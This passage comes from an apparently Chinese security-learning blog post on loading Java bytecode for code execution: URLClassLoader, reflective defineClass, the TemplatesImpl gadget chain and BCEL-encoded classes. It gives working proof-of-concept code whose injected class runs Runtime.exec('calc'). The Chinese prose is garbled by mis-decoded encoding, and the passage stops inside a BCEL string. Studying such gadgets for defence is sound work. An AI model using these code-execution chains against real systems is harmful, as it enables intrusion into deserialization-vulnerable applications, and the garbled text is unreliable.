&#123;<br>        <span class="hljs-type">URLClassLoader</span>  <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;file:///E:\\&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011703834.png"></p><h4 id="2-1-2-http-åè®®"><a href="#2-1-2-http-åè®®" class="headerlink" title="2.1.2 http åè®®"></a>2.1.2 http åè®®</h4><p>å…ˆç”¨python èµ·ä¸€ä¸ª http æœåŠ¡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -m http.server <span class="hljs-number">8999</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011703718.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloClassLoader</span> &#123;<br>    public static void main(String[] args) throws MalformedURLException, InstantiationException, IllegalAccessException, ClassNotFoundException &#123;<br>        URL[] urls = &#123;new URL(<span class="hljs-string">&quot;http://localhost:8999/&quot;</span>)&#125;;<br>        URLClassLoader classLoader = URLClassLoader.newInstance(urls);<br>        Class c = classLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>);<br>        c.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-åˆ©ç”¨-ClassLoader-defineClass-ç›´æ¥åŠ è½½å­—èŠ‚ç "><a href="#2-2-åˆ©ç”¨-ClassLoader-defineClass-ç›´æ¥åŠ è½½å­—èŠ‚ç " class="headerlink" title="2.2 åˆ©ç”¨ ClassLoader#defineClass ç›´æ¥åŠ è½½å­—èŠ‚ç "></a>2.2 åˆ©ç”¨ ClassLoader#defineClass ç›´æ¥åŠ è½½å­—èŠ‚ç </h3><blockquote><p>ä¸ç®¡æ˜¯åŠ è½½è¿œç¨‹classæ–‡ä»¶ï¼Œè¿˜æ˜¯æœ¬åœ°çš„classæˆ–jaræ–‡ä»¶ï¼ŒJavaéƒ½ç»å†çš„æ˜¯ä¸‹é¢è¿™ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨ï¼š</p></blockquote><p>ClassLoader#loadClass -&gt; ClassLoader#findClass -&gt; ClassLoader#defineClass</p><ul><li><code>loadClass</code> çš„ä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆè¿™é‡Œå®é™…ä¸Šæ˜¯åŒäº²å§”æ´¾æœºåˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ findClass</li><li><code>findClass</code> çš„ä½œç”¨æ˜¯æ ¹æ®åŸºç¡€URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå°±åƒä¸Šä¸€èŠ‚ä¸­è¯´åˆ°çš„ï¼Œå¯èƒ½ä¼šåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€jaråŒ…æˆ–è¿œç¨‹httpæœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åäº¤ç»™ defineClass</li><li><code>defineClass</code> çš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±»</li></ul><p>å­¦ä¹ å¦‚ä½•è®©ç³»ç»Ÿçš„ defineClass æ¥ç›´æ¥åŠ è½½å­—èŠ‚ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefineClass</span> &#123;<br>    public static void main(String[] args) throws Exception &#123;<br>        //è·å– ClassLoader çš„ defineClass æ–¹æ³•<br>        Method defineClass = ClassLoader.<span class="hljs-keyword">class</span>.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.<span class="hljs-keyword">class</span>, byte[].<span class="hljs-keyword">class</span>, <span class="hljs-built_in">int</span>.<span class="hljs-keyword">class</span>, <span class="hljs-built_in">int</span>.<span class="hljs-keyword">class</span>);<br>        defineClass.setAccessible(true);<br><br>        //å°† base64 å­—ç¬¦ä¸²è§£ç æˆ <span class="hljs-keyword">class</span> <span class="hljs-title class_">æ–‡ä»¶çš„å­—èŠ‚ç </span><br>        byte[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br>        //åœ¨ç³»ç»Ÿç±»åŠ è½½å™¨ä¸Šè°ƒç”¨ defineClassï¼Œå°†å­—èŠ‚æ•°ç»„å®šä¹‰æˆä¸€ä¸ª Class å¯¹è±¡<br>        Class hello = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>        //è°ƒç”¨æ— å‚æ„é€ <br>        hello.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704376.png"></p><p>è·Ÿè¿› <font style="color:#080808;background-color:#ffffff;">defineClass çœ‹åˆ°å®ƒæ˜¯ä¸€ä¸ª protected å±æ€§ï¼Œæ— æ³•ç›´æ¥è®¿é—®ï¼Œæ‰€ä»¥ä¸Šè¿°ä¾‹å­ä¸­ç”¨åå°„è°ƒç”¨ã€‚</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704651.png"></p><h3 id="2-3-åˆ©ç”¨-TemplatesImpl-åŠ è½½å­—èŠ‚ç "><a href="#2-3-åˆ©ç”¨-TemplatesImpl-åŠ è½½å­—èŠ‚ç " class="headerlink" title="2.3 åˆ©ç”¨ TemplatesImpl åŠ è½½å­—èŠ‚ç "></a>2.3 åˆ©ç”¨ TemplatesImpl åŠ è½½å­—èŠ‚ç </h3><p><font style="color:#080808;background-color:#ffffff;">defineClass æ–¹æ³•æ— æ³•ç›´æ¥ä½¿ç”¨ï¼Œä½†æ˜¯å‘¢ï¼ŒTemplatesImpl ç±»ä¸­ç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå…¥å£ï¼š</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704748.png"></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl ç±»ç»§æ‰¿äº† </font>ClassLoader ï¼Œ<font style="color:#080808;background-color:#ffffff;">å¹¶é‡å†™ defineClass æ–¹æ³•ï¼Œå¹¶ä¸”æ˜¯å¯ä»¥è¢«å¤–éƒ¨è°ƒç”¨</font></p><p>ç°åœ¨ä»¥ <font style="color:#080808;background-color:#ffffff;">TemplatesImpl#defineClass ä¸ºç»ˆç‚¹</font>è·Ÿè¸ªä¸€ä¸‹è¿™æ¡é“¾ï¼š</p><p><font style="color:#080808;background-color:#ffffff;">æŸ¥æ‰¾ç”¨æ³•ï¼šTemplatesImpl.TransletClassLoader.defineClass</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704129.png"></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl.defineTransletClasses.defineClass</font></p><p><font style="color:#080808;background-color:#ffffff;">defineTransletClasses å‡½æ•°è¿˜æ˜¯ç§æœ‰çš„ï¼Œç»§ç»­æ‰¾</font></p><p><font style="color:#080808;background-color:#ffffff;">è¿™é‡ŒæŸ¥æ‰¾ defineTransletClasses çš„ç”¨æ³•åï¼Œæ‰¾åˆ°ä¸‰ä¸ªç»“æœ</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704550.png"></p><p><font style="color:#080808;background-color:#ffffff;">getTransletClasses å’Œ getTransletIndex() éƒ½æ˜¯è¿”å›äº†ä¸€ä¸ªå‚¨å­˜å€¼ï¼Œç”¨äºåç»­æ“ä½œ</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704137.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704963.png"></p><p>è€Œ <font style="color:#080808;background-color:#ffffff;">getTransletInstance ä¸­  .newInstance()  ä¼šè°ƒç”¨æ— å‚æ„é€ åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œå¯ä»¥ç”¨äºæˆ‘ä»¬åç»­çš„ä»£ç æ‰§è¡Œæ‰€ä»¥é‡ç‚¹è·Ÿå®ƒ</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704644.png"></p><p>æ¥åˆ° <font style="color:#080808;background-color:#ffffff;">newTransformer å‡½æ•°ï¼Œå®ƒæ˜¯å…¬æœ‰çš„ï¼Œåˆ°è¿™é‡Œå°±å¯ä»¥äº†</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704704.png"></p><p><strong>å°æ€»ç»“ä¸€ä¸‹ï¼š</strong></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl.TransletClassLoader.defineClass</font></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl.defineTransletClasses.defineClass</font></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl.getTransletInstance.defineTransletClasses</font></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl.newTransformer.getTransletInstance</font></p><p><font style="color:#080808;background-color:#ffffff;">TemplatesImpl</font></p><p><font style="color:#080808;background-color:#ffffff;">newTransformer</font></p><p><font style="color:#080808;background-color:#ffffff;">getTransletInstance</font></p><p><font style="color:#080808;background-color:#ffffff;">defineTransletClasses</font></p><p><font style="color:#080808;background-color:#ffffff;">defineClass</font></p><p><font style="color:#080808;background-color:#ffffff;">TransletClassLoader.defineClass</font></p><p>æ¥ä¸‹æ¥æ„é€  POCï¼š</p><p>é¦–å…ˆæ»¡è¶³ä¿©ä¸ªæ¡ä»¶ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704837.png"></p><p>è¿›å…¥ <font style="color:#080808;background-color:#ffffff;">defineTransletClasses -&gt; newInstance</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011704050.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011716057.png"></p><p><font style="color:#080808;background-color:#ffffff;">å‰åç»“åˆä¸€ä¸‹ï¼Œå°† _bytecodes æ„é€ ä¸ºä¸€ç»´æ•°ç»„å¥—äºŒç»´æ•°ç»„ï¼š</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br></code></pre></td></tr></table></figure><p>_tfactory è¿™ä¸ªå˜é‡è¢«æ ‡è®°ä¸º  <font style="color:#080808;background-color:#ffffff;">transient ï¼ˆä¸å¯åºåˆ—åŒ–ï¼‰</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705518.png"></p><p>ç„¶ååœ¨ readObject ä¸­æ‰¾ï¼šçœ‹åˆ°å·²ç»è¢«èµ‹å€¼äº†</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705580.png"></p><p>å…ˆæ¥ä¸€ä¸ªè¦æ‰§è¡Œçš„ç±»ï¼šå°†å…¶ç¼–è¯‘åæ”¾åœ¨æŒ‡å®šä½ç½®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>  &#123;<br>    <span class="hljs-keyword">static</span>  &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTemplateImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-comment">//è¿™é‡Œå…ˆèµ‹å€¼çœ‹pocæ˜¯å¦æˆåŠŸ</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        templates.newTransformer();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><font style="color:#080808;background-color:#ffffff;">æ‰§è¡ŒåæŠ¥é”™ï¼šNullPointerException</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705977.png"></p><p><font style="color:#080808;background-color:#ffffff;">è°ƒè¯•æŸ¥æ‰¾å“ªé‡Œå‡ºäº†é—®é¢˜ï¼š</font></p><p><font style="color:#080808;background-color:#ffffff;">å¯ä»¥çœ‹åˆ° _transletIndex:-1ã€‚æˆ‘ä»¬éœ€è¦è¿›å…¥åˆ° if è¯­å¥æ‰èƒ½æ­£å¸¸æ‰§è¡Œ</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705557.png"></p><p><font style="color:#080808;background-color:#ffffff;">æ‰€ä»¥è¦è®©æ‰§è¡Œç±»ç»§æ‰¿ </font><font style="color:rgb(44, 62, 80);">AbstractTranslet</font><font style="color:#080808;background-color:#ffffff;"> ç±»(å¯¹åº”ï¼šABSTRACT_TRANSLET)ï¼Œ</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705525.png"></p><p><font style="color:#080808;background-color:#ffffff;">æœ€ç»ˆå®Œæ•´çš„æ‰§è¡Œç±»ï¼š</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>  <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;<br>    <span class="hljs-keyword">static</span>  &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTemplateImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        templates.newTransformer();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705801.png"></p><h3 id="2-4-åˆ©ç”¨-BCEL-ClassLoader-åŠ è½½å­—èŠ‚ç "><a href="#2-4-åˆ©ç”¨-BCEL-ClassLoader-åŠ è½½å­—èŠ‚ç " class="headerlink" title="2.4 åˆ©ç”¨ BCEL ClassLoader åŠ è½½å­—èŠ‚ç "></a><font style="color:#080808;background-color:#ffffff;">2.4 åˆ©ç”¨ BCEL ClassLoader åŠ è½½å­—èŠ‚ç </font></h3><blockquote><p>BCELçš„å…¨ååº”è¯¥æ˜¯Apache Commons BCELï¼Œå±äºApache Commonsé¡¹ç›®ä¸‹çš„ä¸€ä¸ªå­é¡¹ç›®ï¼Œä½†å…¶å› ä¸ºè¢«Apache Xalanæ‰€ä½¿ç”¨ï¼Œè€ŒApache Xalanåˆæ˜¯Javaå†…éƒ¨å¯¹äºJAXPçš„å®ç°ï¼Œæ‰€ä»¥BCELä¹Ÿè¢«åŒ…å«åœ¨äº†JDKçš„åŸç”Ÿåº“ä¸­ã€‚</p><p>å…³äºBCELçš„è¯¦ç»†ä»‹ç»ï¼š<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">ã€ŠBCEL ClassLoaderå»å“ªäº†ã€‹</a></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCEL</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Calc&quot;</span>);<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">javaClass</span> <span class="hljs-operator">=</span> Repository.lookupClass(calc);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(javaClass.getBytes(),<span class="hljs-literal">true</span>);<br>        System.out.println(code);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011705534.png"></p><p><font style="color:#080808;background-color:#ffffff;">æ‰§è¡Œåå¯ä»¥çœ‹åˆ°æœ‰ä¸€å¯¹ä¹±ç ï¼š</font><font style="color:rgb(80, 80, 92);">BCEL ClassLoader æ­£æ˜¯ç”¨äºåŠ è½½è¿™ä¸²ç‰¹æ®Šçš„â€œå­—èŠ‚ç â€ï¼Œå¹¶å¯ä»¥æ‰§è¡Œå…¶ä¸­çš„ä»£ç ã€‚</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">$l$8b$I$A$A$A$A$A$A$Am$<span class="hljs-number">91</span>$c9N$c3$<span class="hljs-number">40</span>$M$<span class="hljs-number">86</span>$ffi$d3$s$N$v$85B$d9$f7$b5$e5$<span class="hljs-number">40</span>$_$dc$<span class="hljs-number">40</span>$5c$QH$<span class="hljs-number">88</span>$b0$<span class="hljs-number">88</span>$o8O$87Q$Z$II$95N$Ro$c4$<span class="hljs-number">99</span>$L$m$O$3c$A$P$<span class="hljs-number">85</span>$f0$M$ab$E$91b$c7$bf$ed$cf$b6$f2$fa$f6$fc$C$<span class="hljs-number">60</span>$NK$3e$3c$M$fb$Y$c1$a8$<span class="hljs-number">871</span>$e3$c7$5dL$f8$c8a$d2$c5$<span class="hljs-number">94</span>$8bi$<span class="hljs-number">86</span>$fc$<span class="hljs-number">86</span>$8a$<span 